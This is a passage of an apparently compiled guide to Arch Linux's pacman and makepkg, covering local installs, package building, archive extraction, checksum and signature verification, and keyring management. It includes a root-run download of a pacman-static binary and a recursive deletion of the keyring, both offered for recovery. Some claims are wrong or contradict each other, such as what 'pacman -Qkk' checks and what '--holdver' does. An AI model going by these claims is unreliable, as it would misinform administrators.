for pkg in "$PACKAGE_DIR"/*.pkg.tar.zst; do
  if sudo pacman -U --noconfirm "$pkg"; then
    echo "✓ Successfully installed: $pkg"
  else
    echo "✗ Failed to install: $pkg"
  fi
done
```

### Common Issues and Solutions

#### Missing Dependencies

**Issue:** Local package requires dependencies not in sync repositories.

**Solution:** Either:
1. Install dependencies manually first
2. Set up a complete local repository with all dependencies[2]

#### File Path Errors

**Issue:** Pacman can't find the package file.

**Solutions:**
- Use absolute paths instead of relative paths
- Verify the file exists: `ls -l /path/to/package.pkg.tar.zst`
- Check file permissions: ensure the file is readable

#### Version Conflicts

**Issue:** Local package version conflicts with installed version.

**Solution:** Remove the existing package first:
```
sudo pacman -R package_name
sudo pacman -U /path/to/new-package.pkg.tar.zst
```

### Best Practices

**Verify package integrity:** Check checksums before installing packages from untrusted sources.

**Keep packages cached:** Use `file://` protocol to maintain cache copies for future use.[5]

**Use local repositories for large collections:** If managing many local packages, set up a proper repository.[2]

**Test in safe environments:** Test local package installations in virtual machines or test systems first.

**Document sources:** Keep records of where local packages came from and why they're needed.

**Maintain dependencies:** Ensure all dependencies are available in sync repositories or your local repository.[2]

**Backup before installation:** Back up important data before installing untrusted local packages.

Sources
[1] How do I install a local/downloaded package using Yay? https://www.reddit.com/r/archlinux/comments/ln65dh/how_do_i_install_a_localdownloaded_package_using/
[2] How to install packages from local folder / Pacman & ... https://bbs.archlinux.org/viewtopic.php?id=119953
[3] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[4] Using pacman Commands in Arch Linux [Beginner's Guide] https://itsfoss.com/pacman-command/
[5] Pacman Cheatsheet https://gist.github.com/HFTrader/4fb15d461d86634fd1cba5d251ca7925
[6] ELI5: Does pacman -S automatically verify package integrity? - Reddit https://www.reddit.com/r/archlinux/comments/69n2ty/eli5_does_pacman_s_automatically_verify_package/
[7] Register a local/user-built package in database using ... https://forum.manjaro.org/t/register-a-local-user-built-package-in-database-using-pamac-pacman/151222
[8] How to Use Pacman in Arch Linux https://www.atlantic.net/dedicated-server-hosting/how-to-use-pacman-in-arch-linux/
[9] How to find where a package is installed by pacman? https://stackoverflow.com/questions/22681578/how-to-find-where-a-package-is-installed-by-pacman

## Package Building Integration

### makepkg Overview

`makepkg` is a script that automates the building of packages from source code. It creates packages that can be installed with pacman, integrating seamlessly with Arch Linux's package management system. The requirements for using makepkg are a build-capable Unix platform and a PKGBUILD file.[1][2]

### Prerequisites

#### Install base-devel

Before building packages, install the `base-devel` meta package:[3][1]

```
sudo pacman -S base-devel
```


**Contents include:**
- GCC compiler
- make and autoconf
- binutils
- fakeroot
- pkg-config
- Other essential build tools[1]

Dependencies of `base-devel` are **not** required to be listed as makedepends in PKGBUILD files.[1]

#### Configure sudo

Ensure sudo is configured properly for commands passed to pacman. Alternatively, specify a different authorization command with `PACMAN_AUTH` in `/etc/makepkg.conf`.[1]

**Important security note:** Running `makepkg` as root is disallowed. Building as root is generally considered unsafe since a PKGBUILD may contain arbitrary commands.[1]

### Basic makepkg Workflow

#### Build Package from PKGBUILD

Navigate to the directory containing the PKGBUILD file and run:[3][1]

```
makepkg
```


**Process:**
1. Downloads source files specified in the PKGBUILD
2. Extracts sources to the `src/` directory
3. Compiles the software
4. Packages compiled files into a `.pkg.tar.zst` archive[4][1]

**Result:** A package file is created in the working directory with the format:
```
packagename-version-release-arch.pkg.tar.zst
```


### Automatic Dependency Management

#### Install Build Dependencies

Use the `-s` or `--syncdeps` flag to automatically install missing build dependencies:[3][1]

```
makepkg -s
```


If required dependencies are missing, makepkg will use pacman to install them before building.[1]

**Note:** These dependencies must be available in configured repositories. Dependencies on AUR packages must be installed manually first.[3][1]

#### Remove Build Dependencies

Add the `-r` or `--rmdeps` flag to remove build dependencies after building:[3][1]

```
makepkg -sr
```


This removes dependencies that are no longer needed after the build completes. Dependencies required for using the package (not just building) are retained.[3][1]

### Automatic Installation

#### Install After Building

Use the `-i` or `--install` flag to automatically install the package after successful building:[5][1][3]

```
makepkg -i
```


This is equivalent to running `pacman -U package-file.pkg.tar.zst` after the build completes.[3][1]

#### Combined Flags (Most Common)

The most commonly used combination installs dependencies, builds, installs the package, and removes unnecessary build dependencies:[5][3]

```
makepkg -si
```


Or for complete automation:
```
makepkg -sri
```


**Breakdown:**
- `-s` - Install build dependencies
- `-r` - Remove build-only dependencies after installation
- `-i` - Install the built package[3]

### Package Output Configuration

#### Default Output Location

By default, makepkg creates package tarballs in the working directory where the command is run.[6][1]

#### Custom Output Directories

Configure custom paths in `/etc/makepkg.conf` or `~/.makepkg.conf`:[6][1]

**PKGDEST:** Directory for storing resulting packages[6][1]
```
PKGDEST=~/build/packages/
```


**SRCDEST:** Directory for storing source data[1]
```
SRCDEST=~/build/sources/
```


**SRCPKGDEST:** Directory for storing source packages (built with `makepkg -S`)[1]
```
SRCPKGDEST=~/build/srcpackages/
```


**Tip:** The PKGDEST directory can be cleaned with `paccache -c ~/build/packages/` like the standard pacman cache.[1]

### Package Format Configuration

#### Output File Extension

The package format is controlled by the `PKGEXT` directive in `/etc/makepkg.conf`:[5]

**Default (modern):**
```
PKGEXT='.pkg.tar.zst'
```


**Alternative formats:**
```
PKGEXT='.pkg.tar.xz'
PKGEXT='.pkg.tar.gz'
```


Pacman can install packages with any of these extensions.[5]

### Cleaning Build Artifacts

#### Clean Temporary Files

Use the `-c` or `--clean` flag to remove temporary build files after completion:[3]

```
makepkg -c
```


This deletes the `src/` directory and other temporary files, useful when debugging build issues.[3]

### Manual Installation After Building

#### Install Package File Manually

If you build without the `-i` flag, install the resulting package manually:[3]

```
sudo pacman -U packagename-version-release-arch.pkg.tar.zst
```


This gives more control over when and how the package is installed.[3]

### Signature Verification

#### Automatic Signature Checking

If a signature file (`.sig` or `.asc`) is part of the PKGBUILD source array, makepkg automatically attempts to verify it.[1]

**Important:** Signature checking in makepkg uses the user's keyring, not pacman's keyring.[1]

#### Skip Signature Verification

Temporarily disable signature checking (not recommended):

```
makepkg --skippgpcheck
```


#### Import Missing Keys

If a required public key is missing, import it manually:[1]

```
gpg --recv-keys KEY_ID
```


The PKGBUILD typically contains a `validpgpkeys` entry with required key IDs.[1]

### Package Signing

#### Sign Built Packages

Sign packages after creation for distribution:[1]

```
gpg --detach-sign --output package.pkg.tar.zst.sig package.pkg.tar.zst
```


This creates a detached signature file that can be used with custom repositories.[1]

### Integration with AUR

#### Building AUR Packages

AUR packages provide PKGBUILD files in git repositories:[5]

```
git clone https://aur.archlinux.org/package-name.git
cd package-name
makepkg -si
```


This downloads the PKGBUILD, builds the package, and installs it automatically.[5]

### Advanced makepkg Options

#### Build Source Package Only

Create a source package without building the binary:

```
makepkg -S
```


This downloads and packages source files without compilation.[6]

#### Force Rebuild

Overwrite existing packages:

```
makepkg -f
```

The `-f` or `--force` flag rebuilds the package even if it already exists.[6]

#### Keep Build Directory

Prevent cleaning of the build directory for debugging:

```
makepkg --holdver
```

This maintains the build environment for inspection.

### Packager Identification

#### Set Packager Name

Identify yourself as the packager in `/etc/makepkg.conf` or `~/.makepkg.conf`:[1]

```
PACKAGER="Your Name <email@example.com>"
```


This information is embedded in package metadata and can be queried later.[1]

#### Query Packages by Packager

Find all packages built by a specific packager using `expac`:[1]

```
expac "%n %p" | grep "packagername" | column -t
```


### Error Handling

#### Dependency Conflicts

If makepkg fails due to dependency issues:

1. Check if dependencies are in configured repositories
2. Install missing dependencies manually: `pacman -S --asdeps dep1 dep2`[1]
3. Retry the build

#### Build Failures

When builds fail:

- Review the error output carefully
- Check if source downloads succeeded
- Verify PKGBUILD syntax
- Consult AUR comments or package documentation
- Use `makepkg -c` to clean and retry

### Best Practices

**Never run as root:** Always build packages as a regular user.[1]

**Use -si combination:** The `-si` flags provide the most convenient workflow.[5][3]

**Read PKGBUILDs:** Always review PKGBUILD files before building, especially from untrusted sources.[5]

**Keep base-devel installed:** Maintain this package group for consistent building capability.[3][1]

**Configure output directories:** Centralize built packages for easier management.[1]

**Update regularly:** Run `git pull` in AUR package directories before rebuilding.[5]

**Sign your packages:** Sign packages if distributing to others or maintaining custom repositories.[1]

**Document modifications:** Keep notes on any PKGBUILD customizations you make.

Sources
[1] makepkg - ArchWiki https://wiki.archlinux.org/title/Makepkg
[2] How to rebuild a package using the Arch Linux Build System https://forum.linuxconfig.org/t/how-to-rebuild-a-package-using-the-arch-linux-build-system-linuxconfig-org/4798
[3] Using Makepkg on Arch Linux https://docs.vultr.com/using-makepkg-on-arch-linux
[4] Can someone explain to me how to package a Pacman ... https://www.reddit.com/r/archlinux/comments/rxzl7z/can_someone_explain_to_me_how_to_package_a_pacman/
[5] Using makepkg - Newbie https://forum.endeavouros.com/t/using-makepkg/6433
[6] Where are makepkg outputs packages built? https://stackoverflow.com/questions/21204934/where-are-makepkg-outputs-packages-built
[7] [SOLVED] Installing with 'makepkg -si' vs 'pacman https://bbs.archlinux.org/viewtopic.php?id=300064
[8] Register a local/user-built package in database using ... https://forum.manjaro.org/t/register-a-local-user-built-package-in-database-using-pamac-pacman/151222
[9] Building a package on ArchLinux (ABS / makepkg) https://www.youtube.com/watch?v=HExYZLpqyfk

## Archive Extraction

### Pacman Package File Structure

Pacman packages are tar archives (typically compressed with zstd, xz, or gzip) containing files to be installed and package metadata. The package file format is `.pkg.tar.zst`, `.pkg.tar.xz`, or `.pkg.tar.gz`.[1][2][3]

### Package Archive Contents

#### Internal Structure

A pacman package archive contains:[2][3]

**Metadata files:**
- `.PKGINFO` - Package information and metadata[3][2]
- `.MTREE` - File integrity checksums and permissions[2][3]
- `.BUILDINFO` - Build environment information[3][2]
- `.INSTALL` (optional) - Pre/post install scripts[3]
- `.CHANGELOG` (optional) - Package changelog[3]

**File hierarchy:**
- Files organized in standard Unix directory structure (`usr/`, `etc/`, etc.)[2]
- Paths are relative to the root filesystem[2]

### Listing Package Contents

#### Using tar to List Files

List the contents of a package archive without extracting:[2][3]

```
tar -tf package-name.pkg.tar.zst
```


**Example:**
```
tar -tf zstd-1.4.9-1-x86_64.pkg.tar.zst
```


**Output shows:**
```
.BUILDINFO
.MTREE
.PKGINFO
usr/
usr/bin/
usr/bin/zstd
usr/lib/
usr/lib/libzstd.so.1.4.9
...
```


#### Using pacman to Query Package Files

Query information from a package file without installing:[4]

```
pacman -Qip /path/to/package.pkg.tar.zst
```


List files that would be installed:
```
pacman -Qlp /path/to/package.pkg.tar.zst
```


### Manual Package Extraction

#### Extract Package Archive

Manually extract a package archive using tar:[3][2]

```
tar -xf package-name.pkg.tar.zst
```


**Extract to specific directory:**
```
tar -xf package-name.pkg.tar.zst -C /destination/path
```

**Extract to root filesystem (dangerous):**
```
sudo tar -xf package-name.pkg.tar.zst -C /
```


**Warning:** Manual extraction bypasses pacman's database tracking. The package manager will not know about manually extracted files.[1][2]

#### Extraction for Inspection

Extract to a temporary location for examination:[2]

```
mkdir /tmp/package-inspection
tar -xf package.pkg.tar.zst -C /tmp/package-inspection
cd /tmp/package-inspection
```


This allows inspecting package contents without affecting the system.[2]

### Examining Package Metadata

#### View .PKGINFO File

After extracting, examine the `.PKGINFO` file for package meta[3][2]

```
tar -xf package.pkg.tar.zst .PKGINFO
cat .PKGINFO
```


**Contents include:**
- Package name and version
- Dependencies
- Conflicts
- Provides
- Architecture
- Build date
- Packager information[3]

#### View .MTREE File

The `.MTREE` file contains file integrity information:[3][2]

```
tar -xf package.pkg.tar.zst .MTREE
zcat .MTREE | less
```


This file is gzipped and contains checksums and permissions for all files in the package.[3][2]

### Emergency Recovery Extraction

#### System Recovery Scenario

When pacman is broken and cannot install packages normally:[1]

**Step 1: Extract package manually**
```
sudo tar -xf /var/cache/pacman/pkg/pacman-*.pkg.tar.zst -C /
```


**Step 2: Rebuild database entry**
```
sudo pacman -S --overwrite "*" pacman
```


This reinstalls pacman to the database after manual file extraction.[1]

**Alternative: Use pacman-static**
Instead of manual extraction, use the static pacman binary which doesn't depend on system libraries:
```
curl -L -o pacman-static https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static
chmod +x pacman-static
sudo ./pacman-static -Syu pacman
```


### Extracting Specific Files

#### Extract Individual Files from Package

Extract only specific files from a package archive:

```
tar -xf package.pkg.tar.zst path/to/specific/file
```

**Example - Extract only binaries:**
```
tar -xf firefox.pkg.tar.zst usr/bin/
```

**Example - Extract only documentation:**
```
tar -xf package.pkg.tar.zst usr/share/doc/
```

### Archive Format Handling

#### Different Compression Formats

Pacman packages can use various compression formats:

**zstd (modern default):**
```
tar -xf package.pkg.tar.zst
```

**xz (older standard):**
```
tar -xf package.pkg.tar.xz
```

**gzip (legacy):**
```
tar -xf package.pkg.tar.gz
```

**Uncompressed:**
```
tar -xf package.pkg.tar
```

Modern tar automatically detects compression format, so the same command works for all:
```
tar -xf package.pkg.tar.*
```

### Viewing Compressed Metadata Without Extraction

#### Using zcat for Gzipped Files

View gzipped metadata files directly:[2]

```
tar -xOf package.pkg.tar.zst .MTREE | zcat | less
```


The `-O` flag outputs to stdout, piping to `zcat` for decompression and `less` for viewing.[2]

### Package Archive Tools

#### File Command

Identify the archive type:

```
file package.pkg.tar.zst
```

**Output:**
```
package.pkg.tar.zst: Zstandard compressed data
```

#### Archive Utilities

Common tools for working with package archives:

- `tar` - Extract and list archive contents
- `zcat` / `zless` / `zgrep` - Work with gzipped files
- `xzcat` / `xzless` - Work with xz-compressed files
- `zstdcat` - Work with zstd-compressed files

### Security Considerations

#### Avoid Manual Extraction

**Warning:** Manually extracting packages to the root filesystem is dangerous and should only be done in emergency recovery scenarios.[1]

**Risks:**
- Bypasses pacman database tracking
- No dependency verification
- No conflict checking
- Can overwrite important system files
- Leaves system in inconsistent state

**Proper alternative:** Always use `pacman -U` for package installation, which handles extraction safely with database integration.[1]

### Educational Package Exploration

#### Learning Package Structure

Extract packages to examine their structure for educational purposes:[2]

```
# Copy package to temporary location
cp /var/cache/pacman/pkg/package.pkg.tar.zst /tmp/
cd /tmp

# Extract package
tar -xf package.pkg.tar.zst

# Explore contents
tree -L 3

# Read metadata
cat .PKGINFO
cat .BUILDINFO
zcat .MTREE | less
```


This helps understand how pacman packages are organized and what files they install.[2]

### Best Practices

**Use pacman for installation:** Always prefer `pacman -U` over manual extraction for actual installation.[1]

**Extract to safe locations:** When inspecting packages, extract to temporary directories, not root.[2]

**Examine before installing:** Review package contents before installation to understand what will be installed.

**Respect meta** Package metadata files (`.PKGINFO`, `.MTREE`) provide important information about the package.

**Emergency only:** Only manually extract to root filesystem in emergency recovery scenarios when pacman is completely broken.[1]

**Database consistency:** If you manually extract files, always reinstall properly afterward to update pacman's database.[1]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] How do you learn how pacman & AUR helpers work? https://www.reddit.com/r/archlinux/comments/ncofi1/how_do_you_learn_how_pacman_aur_helpers_work/
[3] What Makes a Pacman Package https://gist.github.com/Earnestly/bebad057f40a662b5cc3
[4] pacman(8) https://pacman.archlinux.page/pacman.8.html
[5] archive_read_extract(3) - Arch manual pages https://man.archlinux.org/man/archive_read_extract.3.en
[6] Is it safe to manually delete a package from the ... https://www.facebook.com/groups/archlinuxen/posts/10158299629538393/
[7] Unzip Command in Linux https://www.geeksforgeeks.org/linux-unix/unzip-command-in-linux/
[8] Package Management https://www.msys2.org/docs/package-management/
[9] What is a package? And what do package managers like ... https://www.reddit.com/r/linux4noobs/comments/1gr90ad/what_is_a_package_and_what_do_package_managers/
[10] How to Manage Packages in Arch Using Pacman | Linode Docs https://www.linode.com/docs/guides/pacman-package-manager/

## File Verification

### Automatic Package Verification During Installation

#### Signature Verification

Pacman automatically verifies package integrity during installation using GPG signatures. This depends on the `SigLevel` setting configured in `/etc/pacman.conf`.[1]

**Process during installation:**
```
(1/1) checking keys in keyring
(1/1) checking package integrity
```


The signature verification ensures packages haven't been altered or tampered with during download or storage.[1]

#### Checksum vs Signature Verification

**Checksums:** Verify file integrity (detect corruption during download)[1]

**Signatures:** Verify authenticity (cryptographic proof the package comes from trusted source)[1]

Checksums alone are not for security—they only determine if the file was downloaded correctly. Signatures provide actual security guarantees.[1]

### Installed Package File Verification

#### Basic File Presence Check

Verify that all files from an installed package still exist on the system:[2][3]

```
pacman -Qk package_name
```


This checks if files are present but doesn't verify their integrity.[2]

**Check all installed packages:**
```
pacman -Qk
```


#### Thorough Integrity Check

Perform extensive verification including checksums, sizes, and permissions:[2][3]

```
pacman -Qkk package_name
```


The double `-kk` performs comprehensive checks including:
- File presence
- File sizes
- Modification times
- MD5 checksums
- Permissions and ownership[3]

**Check all packages thoroughly:**
```
pacman -Qkk
```


**Important limitation:** `pacman -Qkk` does **not** verify checksums—it only checks file attributes. For actual checksum verification, use `paccheck`.[1]

### Advanced Checksum Verification with paccheck

#### Installing paccheck

The `paccheck` utility from `pacutils` provides genuine checksum verification:[2]

```
sudo pacman -S pacutils
```


#### Checksum Verification Commands

**Verify MD5 checksums:**
```
paccheck --md5sum --quiet
```


**Verify SHA256 checksums:**
```
paccheck --sha256sum --quiet
```

**Combined verification:**
```
paccheck --md5sum --sha256sum --file-properties --quiet
```


This performs comprehensive validation including checksums and file attributes.[4]

**Output interpretation:**
- Displays only packages with integrity issues when using `--quiet`
- Shows which files have been modified, missing, or corrupted
- Reports checksum mismatches

### Verifying Package Archives

#### Manual Checksum Verification

For downloaded package files, verify integrity before installation using standard hash tools:[5][6]

**Generate SHA256 checksum:**
```
sha256sum package.pkg.tar.zst
```


**Compare with official checksum:**
If a checksum file is provided (e.g., `SHA256SUMS`):
```
sha256sum -c SHA256SUMS
```


This checks all files listed in the checksum file and reports matches/mismatches.[5]

**Other checksum algorithms:**
```
md5sum package.pkg.tar.zst
sha1sum package.pkg.tar.zst
sha512sum package.pkg.tar.zst
```


#### GPG Signature Verification

Verify package signature files (`.sig`) manually:

```
gpg --verify package.pkg.tar.zst.sig package.pkg.tar.zst
```

**Import required keys if missing:**
```
gpg --recv-keys KEY_ID
```

### Verification in Package Building

#### makepkg Integrity Checks

During package building, `makepkg` automatically verifies source file checksums defined in the PKGBUILD:[7][8]

**Checksum arrays in PKGBUILD:**
- `md5sums`
- `sha1sums`
- `sha256sums`
- `sha384sums`
- `sha512sums`[8]

**Skip integrity checks (not recommended):**
```
makepkg --skipinteg
```


**Skip only checksum verification:**
```
makepkg --skipchecksums
```


**Skip only PGP verification:**
```
makepkg --skippgpcheck
```


#### SKIP Directive in Checksums

PKGBUILDs can use `SKIP` in checksum arrays to bypass integrity checks for specific sources:[8]

```
sha256sums=('abc123...' 'SKIP' 'def456...')
```


This is useful for user-configurable sources where checksums cannot be predetermined.[8]

### ISO File Verification

#### Verifying Installation Media

When downloading Arch Linux ISO files, verify integrity and authenticity:[9]

**Step 1: Verify checksum (integrity)**
```
sha256sum archlinux-YYYY.MM.DD-x86_64.iso
```


Compare output with the official checksum from the Arch website.[9]

**Step 2: Verify PGP signature (authenticity)**
```
gpg --verify archlinux-YYYY.MM.DD-x86_64.iso.sig
```


**Why both are important:**
- MD5/SHA checksums verify the file wasn't corrupted during download[9]
- PGP signatures prevent malicious tampering even if the website is compromised[9]

A compromised website could provide matching checksums for a malicious ISO, but cannot forge valid PGP signatures.[9]

### Graphical Verification Tools

#### GtkHash

For users preferring GUI tools, `gtkhash` provides graphical checksum verification:[6]

```
sudo pacman -S gtkhash
```


**Features:**
- Calculate multiple hash types simultaneously
- Compare hashes visually
- Verify hash files
- User-friendly interface[6]

**Usage:**
1. Open GtkHash application
2. Add files to verify
3. Click "Hash" to calculate checksums
4. Compare with official checksums[6]

### Best Practices

**Always verify downloads:** Check checksums and signatures for ISO files and packages from untrusted sources.[9]

**Use both checksums and signatures:** Checksums verify integrity; signatures verify authenticity.[1][9]

**Regular integrity checks:** Periodically run `pacman -Qkk` or `paccheck` to detect file corruption or tampering.[4][3]

**Inspect verification output:** Don't ignore warnings about modified files—investigate the cause.[3]

**Configuration files are expected to differ:** Modified config files in `/etc/` are normal and expected.[3]

**Update keyrings:** Keep `archlinux-keyring` updated to avoid signature verification failures.[1]

**Don't skip verification unnecessarily:** Only use `--skipinteg` or `--skippgpcheck` when absolutely necessary and you understand the security implications.[7]

**Verify third-party packages:** Always verify checksums and signatures for packages from sources outside official repositories.[6]

Sources
[1] ELI5: Does pacman -S automatically verify package integrity? https://www.reddit.com/r/archlinux/comments/69n2ty/eli5_does_pacman_s_automatically_verify_package/
[2] [SOLVED] How to check integrity of package files / Pacman ... https://bbs.archlinux.org/viewtopic.php?id=195645
[3] Arch/Manjaro Linux: Checking Installed Package Integrity ... https://buymeacoffee.com/politictech/arch-linux-checking-installed-package-integrity-checksums-file-changes
[4] Check all installed packages for integrity - Pacman & AUR helpers https://forum.endeavouros.com/t/check-all-installed-packages-for-integrity/5297
[5] How to Verify SHA256 Checksum of File in Linux https://www.ubuntumint.com/verify-sha256-checksum-of-file-in-linux/
[6] How to Verify Checksums in Linux https://www.maketecheasier.com/verify-checksums-in-linux/
[7] Allow to skip validity checks · Issue #108 · archlinuxfr/yaourt https://github.com/archlinuxfr/yaourt/issues/108
[8] [pacman-dev] [PATCH] makepkg: Use SKIP in checksum to ... https://lists.archlinux.org/archives/list/pacman-dev@lists.archlinux.org/thread/FX54XEPEKKLREAI3YCWLZBZJD4GWGXRW/
[9] How to verify ArchLinux ISO file with PGP signature, MD5 ... https://www.youtube.com/watch?v=UeQKJOozpFI
[10] Show HN: Checksum.sh verify every install script https://news.ycombinator.com/item?id=33375554


# Signature Verification


## GPG Key Management

### Overview of Pacman's Keyring System

Pacman uses OpenPGP keys in a web of trust model to verify that packages are authentic. The `pacman-key` utility is a wrapper script for GnuPG that manages pacman's keyring—the collection of PGP keys used to check signed packages and databases.[1][2][3]

The keyring is stored by default in `/etc/pacman.d/gnupg/`.[2][3][4]

### Initial Keyring Setup

#### Initialize the Keyring

Initialize pacman's keyring before first use:[3][1][2]

```
sudo pacman-key --init
```


This creates necessary GnuPG directories and files, ensuring the keyring is properly initialized with required access permissions.[2][3]

#### Populate with Master Keys

Populate the keyring with official Arch Linux master keys and developer keys:[3][1][2]

```
sudo pacman-key --populate archlinux
```


**Important:** Take time to verify the Master Signing Keys when prompted, as these are used to co-sign (and therefore trust) all other packager keys.[1]

**Complete initial setup:**
```
sudo pacman-key --init
sudo pacman-key --populate archlinux
```


### Verifying Master Keys

OpenPGP keys are too large (2048+ bits) for humans to verify directly, so they are hashed to create a 40-hex-digit fingerprint. The last eight digits serve as the "short key ID," while the last sixteen digits form the "long key ID".[1]

**Display key fingerprints:**
```
pacman-key --finger keyid
```


Compare displayed fingerprints against official sources to verify authenticity.[1]

### Managing Developer Keys

#### Automatic Key Downloads

Official Arch Linux developer and package maintainer keys are signed by master keys, so they don't need manual signing. When pacman encounters an unrecognized key, it prompts to download it from a keyserver configured in `/etc/pacman.d/gnupg/gpg.conf`.[1]

Once downloaded, developer keys can verify all packages signed by that developer without re-downloading.[1]

#### Refreshing Keys

Update existing keys from keyservers:[2][3][1]

```
sudo pacman-key --refresh-keys
```


This updates key information and trust status from remote keyservers. Your local key will also be queried, and receiving a "not found" message is normal and not concerning.[1]

**Note:** The `archlinux-keyring` package (a dependency of `base`) contains the latest keys. Keys can be updated either by upgrading this package or manually refreshing them.[1]

### Adding Unofficial Keys

For custom repositories or AUR packages with signatures, add third-party keys:[1]

#### Import Key from Keyserver

If the key is available on a keyserver:[1]

```
sudo pacman-key --recv-keys keyid
```


#### Import Key from File

If provided with a keyfile download:[1]

```
sudo pacman-key --add /path/to/downloaded/keyfile
```


#### Verify Key Fingerprint

Always verify the fingerprint before trusting:[1]

```
pacman-key --finger keyid
```


Compare the fingerprint against the one provided by the key owner through a trusted channel.[1]

#### Locally Sign the Key

Finally, locally sign the imported key to trust it:[1]

```
sudo pacman-key --lsign-key keyid
```


This indicates you trust this key to sign packages.[1]

### Listing and Exporting Keys

#### List All Keys

Display all keys in the keyring:[3][2]

```
pacman-key --list-keys
```


Or list specific keys:
```
pacman-key --list-keys keyid
```

#### Export Keys

Export keys to stdout or a file:[3][2]

```
pacman-key --export keyid
```


Export all keys:
```
pacman-key --export
```


#### Display Fingerprints

Show fingerprints for all or specific keys:[3][2]

```
pacman-key --finger
pacman-key --finger keyid
```


### Removing Keys

Delete specific keys from the keyring:[3][2]

```
sudo pacman-key --delete keyid
```


### Troubleshooting Keyring Issues

#### Common Problems

Keyring issues typically arise from:[5][1]
- Outdated `archlinux-keyring` package[5][1]
- Incorrect system clock/date[1]
- ISP blocking keyserver ports[1]
- Cached unsigned packages from previous attempts[1]
- Improperly configured `dirmngr`[1]

#### Signature Verification Errors

**Error messages:**
```
error: package: signature from "..." is unknown trust
error: failed to commit transaction (invalid or corrupted package)
```


**Primary solution - Update archlinux-keyring:**
```
sudo pacman -Sy archlinux-keyring
sudo pacman -Syu
```


This updates the keyring before performing a full system upgrade.[6][7]

#### Complete Keyring Reset

When standard fixes fail, completely regenerate the keyring:[8][9]

```
sudo rm -rf /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux
```


**Warning:** This deletes all custom keys. You'll need to re-add any third-party repository keys.[8]

#### Change Keyserver

If the default keyserver is unreachable, switch to an alternative:[1]

Edit `/etc/pacman.d/gnupg/gpg.conf`:
```
keyserver hkp://keyserver.ubuntu.com
```


Or use the command-line option:
```
sudo pacman-key --keyserver keyserver.ubuntu.com --recv-keys keyid
```


#### Clean Package Cache

If cached packages contain invalid signatures:[1]

```
sudo pacman -Scc
```


This removes all cached packages, forcing fresh downloads with valid signatures.[1]

#### Verify System Time

Incorrect system time causes signature verification failures:[1]

```
timedatectl status
```

Ensure the clock is set correctly. GPG signatures have validity periods that fail if the system time is wrong.[1]

### Upgrade System Regularly

Regular system upgrades prevent most signing errors. If extended delays are unavoidable, manually sync the database and upgrade `archlinux-keyring` before the full system upgrade:[1]

```
sudo pacman -Sy archlinux-keyring
sudo pacman -Syu
```


### Direct GnuPG Access

For advanced debugging, access pacman's keyring directly with GnuPG:[1]

```
sudo gpg --homedir /etc/pacman.d/gnupg --list-keys
```


This provides lower-level keyring management capabilities for complex scenarios.[2][1]

### Key Trust Levels

#### Edit Key Trust

Adjust a key's trust level interactively:[2]

```
sudo pacman-key --edit-key keyid
```


This presents a menu for key management tasks, including setting trust levels.[2]

### Security Best Practices

**Verify fingerprints:** Always verify key fingerprints before signing or trusting them.[1]

**Keep keyring updated:** Regularly update `archlinux-keyring` to receive new keys and revocations.[1]

**Use trusted sources:** Only add keys from verified, trustworthy sources.[3]

**Don't disable signatures:** Avoid using `SigLevel = Never` in production—it bypasses all security checks.[6]

**Regular upgrades:** Keep your system updated to prevent keyring inconsistencies.[1]

**Verify master keys:** Take time to verify Arch Linux master signing keys during initial setup.[1]

**Network connectivity required:** Key refresh and receipt operations require internet access.[3]

**Root privileges needed:** Most keyring operations require root access.[3]

Sources
[1] pacman/Package signing - ArchWiki https://wiki.archlinux.org/title/Pacman/Package_signing
[2] pacman-key(8) https://pacman.archlinux.page/pacman-key.8.html
[3] pacman-key man | Linux Command Library https://linuxcommandlibrary.com/man/pacman-key
[4] Two PGP Keyrings for Package Management in Arch Linux http://allanmcrae.com/2015/01/two-pgp-keyrings-for-package-management-in-arch-linux/
[5] Pacman won't let me install anything because of broken pgp keys. https://www.reddit.com/r/archlinux/comments/z9wb5u/pacman_wont_let_me_install_anything_because_of/
[6] Error: archlinux-keyring: signature from is unknown trust https://forum.manjaro.org/t/error-archlinux-keyring-signature-from-is-unknown-trust/166232
[7] Archlinux keyring fails to update - Manjaro Linux Forum https://forum.manjaro.org/t/archlinux-keyring-fails-to-update/164313
[8] pacman suddenly complains about keyring - Arch Linux Forums https://bbs.archlinux.org/viewtopic.php?id=290769
[9] Help with keyring issue - Pacman & AUR helpers - EndeavourOS https://forum.endeavouros.com/t/help-with-keyring-issue/54623
[10] GnuPG - ArchWiki https://wiki.archlinux.org/title/GnuPG

## Package Signature Checking

### Overview of Package Signing

Pacman uses OpenPGP keys in a web of trust model to verify that packages are authentic. Each package distributed through Arch Linux repositories is cryptographically signed by package maintainers, and these signatures are verified during installation.[1][4][5]

### How Signature Verification Works

#### Verification Process

When installing packages, pacman performs the following steps:[2][4][5]

1. **Download phase:** Package and its signature file (`.sig`) are downloaded
2. **Signature checking:** Pacman verifies the GPG signature against known trusted keys[4]
3. **Key validation:** Ensures the signing key is trusted through the web of trust[1]
4. **Installation:** Package is installed only if signature verification succeeds[5]

**Installation output shows:**
```
(1/1) checking keys in keyring
(x/100) checking package integrity
```


The "checking package integrity" phase verifies all `.sig` files with GPG, which can take significant time for large package sets (30-40% of total installation time).[2]

### SigLevel Configuration

#### Understanding SigLevel

The `SigLevel` option in `/etc/pacman.conf` determines the trust level required to install packages. This can be configured globally in the `[options]` section or per-repository.[7][5][1]

#### Default Configuration

**Standard secure configuration:**
```
# /etc/pacman.conf
[options]
SigLevel = Required DatabaseOptional
```


**Breakdown:**
- `Required` - Package signatures are mandatory[1]
- `DatabaseOptional` - Repository databases don't require signatures (work in progress)[1]
- `TrustedOnly` - Implied default, only trusts verified keys[1]

#### Repository-Specific Settings

Configure signature checking per repository:[5][1]

```
[core]
SigLevel = PackageRequired
Include = /etc/pacman.d/mirrorlist

[extra]
SigLevel = PackageRequired
Include = /etc/pacman.d/mirrorlist
```


Repository-specific `SigLevel` settings override global settings.[1]

### SigLevel Options

#### Trust Levels

**Required:** Signatures are mandatory; unsigned packages will be rejected[1]

**Optional:** Signatures are checked if present but not required[1]

**Never:** Signature checking is completely disabled[7][1]

**TrustedOnly:** Only keys in the web of trust are accepted (default)[1]

**TrustAll:** Accept any signature, even from unverified keys (debugging only)[7][1]

#### Scope Modifiers

**Package:** Applies to package files[1]

**Database:** Applies to repository databases[1]

**Combined examples:**
```
